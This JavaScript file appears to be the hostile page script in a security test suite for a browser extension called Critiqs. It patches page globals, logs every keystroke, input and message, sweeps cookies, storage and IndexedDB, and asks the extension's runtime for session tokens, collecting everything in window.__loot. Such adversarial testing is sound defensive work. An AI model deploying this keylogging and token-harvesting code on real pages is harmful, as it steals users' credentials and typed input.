// The hostile test page's own script (the page's world). It patches the
// globals a careless content script would lean on or leak through, logs every
// key and message, then keeps trying every route it has to the reviewer's
// session, and keeps everything it gathers in window.__loot, which the run
// searches for the session's tokens.
(() => {
  // The development ID is public, so a page may know it.
  const EXTENSION_ID = "pfdpnmmiemejphfghkalofichdcoandg";
  const loot = (window.__loot = { notes: [], keys: [], inputs: [], messages: [], requests: [], roots: [], text: [], errors: [], answers: {} });
  const note = (what) => loot.notes.push(String(what).slice(0, 500));

  Array.prototype.__pagePatched = true;
  const map = Array.prototype.map;
  Array.prototype.map = function (...args) { return map.apply(this, args); };
  Array.prototype.includes = function () { return false; };
  Object.defineProperty(Object.prototype, "accessToken", { set(value) { note(`setter caught accessToken ${value}`); }, get() { return undefined; }, configurable: true });
  Object.defineProperty(Object.prototype, "refreshToken", { set(value) { note(`setter caught refreshToken ${value}`); }, get() { return undefined; }, configurable: true });
  const realFetch = window.fetch;
  window.fetch = function (input, init) {
    loot.requests.push({ via: "fetch", url: String(input), headers: JSON.stringify(init?.headers ?? null), body: String(init?.body ?? "").slice(0, 2000) });
    return realFetch.apply(this, arguments);
  };
  const RealWebSocket = window.WebSocket;
  window.WebSocket = function (url, protocols) {
    loot.requests.push({ via: "WebSocket", url: String(url) });
    const socket = new RealWebSocket(url, protocols);
    const send = socket.send.bind(socket);
    socket.send = (data) => (loot.requests.push({ via: "ws.send", data: String(data).slice(0, 2000) }), send(data));
    socket.addEventListener("message", (event) => loot.requests.push({ via: "ws.message", data: String(event.data).slice(0, 2000) }));
    return socket;
  };
  const setHeader = XMLHttpRequest.prototype.setRequestHeader;
  XMLHttpRequest.prototype.setRequestHeader = function (name, value) { loot.requests.push({ via: "xhr", name, value }); return setHeader.call(this, name, value); };
  const attach = Element.prototype.attachShadow;
  Element.prototype.attachShadow = function (init) {
    const root = attach.call(this, { ...init, mode: "open" });
    note(`attachShadow intercepted on <${this.localName}> (asked ${init.mode})`);
    loot.roots.push(root);
    return root;
  };
  const parse = JSON.parse;
  JSON.parse = function (text, reviver) { if (typeof text === "string" && /eyJ|refresh/i.test(text)) note(`JSON.parse saw ${text.slice(0, 2000)}`); return parse.call(this, text, reviver); };
  const stringify = JSON.stringify;
  JSON.stringify = function (value, ...rest) { const out = stringify.call(this, value, ...rest); if (typeof out === "string" && /eyJ|refresh/i.test(out) && !out.includes("__loot")) note(`JSON.stringify saw ${out.slice(0, 2000)}`); return out; };
  const addListener = EventTarget.prototype.addEventListener;
  EventTarget.prototype.addEventListener = function (type, listener, options) { if (this instanceof ShadowRoot || (this instanceof Element && this.localName === "critiqs-root")) note(`addEventListener on Critiqs (${type})`); return addListener.call(this, type, listener, options); };
  const setItem = Storage.prototype.setItem;
  Storage.prototype.setItem = function (key, value) { loot.text.push(`storage ${key}=${String(value).slice(0, 2000)}`); return setItem.call(this, key, value); };

  // A key logger and a message sniffer, in the capture phase, before anyone else.
  addListener.call(window, "keydown", (event) => loot.keys.push(`${event.key}@${event.composedPath()[0]?.localName ?? "?"}`), true);
  addListener.call(window, "input", (event) => loot.inputs.push(`${event.data ?? ""}|${event.target?.localName}|${event.target?.value ?? ""}`), true);
  addListener.call(window, "message", (event) => loot.messages.push(stringify.call(JSON, event.data)?.slice(0, 2000) ?? String(event.data)), true);
  addListener.call(window, "error", (event) => loot.errors.push(String(event.message)), true);

  const sweep = async () => {
    loot.chrome = typeof window.chrome === "object" ? Object.keys(window.chrome) : typeof window.chrome;
    loot.runtime = typeof window.chrome?.runtime;
    for (const [name, attempt] of [
      ["sendMessage", () => window.chrome.runtime.sendMessage(EXTENSION_ID, { type: "critiqs:token", force: false })],
      ["connect", () => window.chrome.runtime.connect(EXTENSION_ID).postMessage({ type: "critiqs:token" })],
    ]) {
      try { loot.answers[name] = stringify.call(JSON, await attempt()) ?? "undefined"; } catch (error) { loot.answers[name] = `refused: ${error.message}`; }
    }
    const hosts = [...document.querySelectorAll("critiqs-root")];
    loot.hosts = hosts.map((host) => ({ shadowRoot: host.shadowRoot === null ? "null" : "open", text: (host.shadowRoot?.textContent ?? host.textContent ?? "").slice(0, 2000), attributes: [...host.attributes].map((a) => `${a.name}=${a.value}`) }));
    loot.stolenRootText = loot.roots.map((root) => (root.textContent ?? "").slice(0, 2000));
    loot.html = document.documentElement.outerHTML.slice(0, 200000);
    loot.storage = { local: { ...localStorage }, session: { ...sessionStorage }, cookie: document.cookie, name: window.name };
    loot.databases = indexedDB.databases ? (await indexedDB.databases()).map((db) => db.name) : "n/a";
    loot.resources = performance.getEntriesByType("resource").map((entry) => entry.name).slice(-80);
    loot.windowKeys = Object.keys(window).filter((key) => key !== "__loot").slice(0, 200);
    loot.windowValues = loot.windowKeys.map((key) => { try { const value = window[key]; return typeof value === "string" ? `${key}=${value.slice(0, 500)}` : key; } catch { return key; } });
    for (const path of ["manifest.json", "worker.js", "allow.html", "overlay.js"]) {
      try { loot.answers[`ext:${path}`] = `${(await realFetch(`chrome-extension://${EXTENSION_ID}/${path}`)).status}`; } catch (error) { loot.answers[`ext:${path}`] = `refused: ${error.message}`; }
    }
    // Made-up events at Critiqs's element, and a made-up shortcut key on the document.
    for (const host of hosts) {
      host.click();
      host.dispatchEvent(new MouseEvent("click", { bubbles: true, composed: true }));
    }
    if (loot.syntheticKey) document.dispatchEvent(new KeyboardEvent("keydown", { key: loot.syntheticKey, code: `Key${loot.syntheticKey.toUpperCase()}`, bubbles: true, composed: true }));
    loot.activeElement = document.activeElement?.localName;
    loot.selection = String(getSelection());
    document.getElementById("loot").textContent = `swept ${new Date().toISOString()}`;
  };
  window.__sweep = sweep;
  setInterval(() => void sweep().catch((error) => loot.errors.push(`sweep: ${error.message}`)), 3000);
})();
